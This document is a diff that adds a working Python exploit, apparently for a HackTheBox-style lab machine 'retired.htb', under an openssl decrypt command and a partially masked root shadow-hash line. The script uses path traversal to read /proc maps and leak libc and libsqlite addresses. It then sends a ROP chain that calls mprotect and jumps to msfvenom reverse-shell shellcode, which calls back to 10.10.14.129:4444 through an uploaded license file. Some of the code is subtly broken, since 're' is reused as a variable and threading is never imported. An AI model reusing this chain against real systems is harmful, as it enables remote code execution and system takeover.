@@ -1,3 +1,120 @@
 ```openssl enc -d -aes-256-cbc -salt -pbkdf2 -in exploit.py.enc -out exploit.py```
 
 Pass: ```root:$y$j9T$.......................fn1CzA:19062:0:99999:7:::```
+
+```python
+from pwn import *
+import requests
+import os
+#import netifaces as ni
+import subprocess
+import shlex
+
+#r = remote("localhost", 1337)
+#context.log_level = "debug"
+#ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
+
+# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.129 LPORT=4444 -f python
+buf =  b""
+buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
+buf += b"\x97\x48\xb9\x02\x00\x11\x5c\x0a\x0a\x0e\x81\x51\x48"
+buf += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
+buf += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
+buf += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
+buf += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
+
+def bruteforce():
+    log.progress("Bruteforcing...")
+    for num in range(10000):
+#    print("Trying: "+"/proc/"+str(num)+"/maps")
+        target = "http://retired.htb/index.php?page=../../../../../../../proc/{}/maps".format(num)
+        req = requests.get(target, allow_redirects=False)
+        if "activate_license" in req.text:
+            log.success("/proc/{}/maps".format(num))
+            procFile = open("maps", "w")
+            procFile.write(req.text)
+            procFile.close()
+            return
+
+def file_upload():
+    url = "http://retired.htb/activate_license.php"
+    licenseFile = open("license", "rb")
+    re = requests.post(url, files={"licensefile": licenseFile})
+    if re.ok:
+        print("")
+        log.success("Uploaded license file.")
+#    print(r.text)
+    else:
+        log.error("Upload failed.")
+    return
+
+#log.progress("Bruteforcing...")
+bruteforce()
+
+ff = open("maps", "r")
+maps = ff.read()
+# Base
+stackAddr = re.search(r".*\[stack\].*", maps).group(0).partition("-")  #[0:-55]
+stackBase = int(stackAddr[0], 16)
+# End
+stackAddr = re.search(r".*\[stack\].*", maps).group(0).split("-")
+stackAddr = stackAddr[1].split(" ")
+stackEnd = int(stackAddr[0], 16)
+#print(hex(stackEnd))
+
+libc = ELF("./libc-2.31.so")
+libsql = ELF("./libsqlite3.so.0.8.6")
+offset = 520 
+
+libcBase = re.search(r".*/usr/lib/x86_64-linux-gnu/libc-2.31.so.*", maps).group(0).split("-")
+libcBase = int(libcBase[0], 16)
+libsqlBase = re.search(r".*/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6.*", maps).group(0).split("-")
+libsqlBase = int(libsqlBase[0], 16)
+#stackBase = 0x7ffc5257f000
+#stackEnd = 0x7ffc525a00
+stackSize = 0x21000 # stackBase - stackEnd
+mprotect = libcBase + libc.symbols['mprotect']
+pop_rdi = libcBase + 0x0000000000026796 # pop rdi ; ret
+pop_rsi = libcBase + 0x000000000002890f # pop rsi ; pop r15 ; ret
+pop_rdx = libcBase + 0x00000000000cb1cd # pop rdx ; ret
+jmp_rsp = libsqlBase + 0x00000000000d431d # jmp rsp ; ret (libsqlite3.so.0.8.6)
+
+payload = b""
+payload += b"A"*offset
+
+payload += p64(pop_rdi)
+payload += p64(stackBase)
+
+payload += p64(pop_rsi)
+payload += p64(stackSize)
+
+payload += p64(pop_rdx)
+payload += p64(0x7)
+payload += p64(mprotect)
+
+payload += p64(jmp_rsp)
+payload += buf
+
+log.success("stackBase: {}".format(hex(stackBase)))
+log.success("stackEnd: {}".format(hex(stackBase)))
+log.success("mprotect: {}".format(hex(mprotect)))
+log.success("libcBase: {}".format(hex(libcBase)))
+log.success("libsqlBase: {}".format(hex(libsqlBase)))
+
+f = open("license", "wb")
+f.write(payload)
+f.close()
+
+def shellStart():
+    r = listen(4444, timeout=10).wait_for_connection()
+    r.sendline(b"whoami")
+    r.interactive()
+
+t=threading.Thread(target=shellStart)
+t.start()
+file_upload()
+os.system("rm maps;rm license")
+ff.close()
+
+
+```
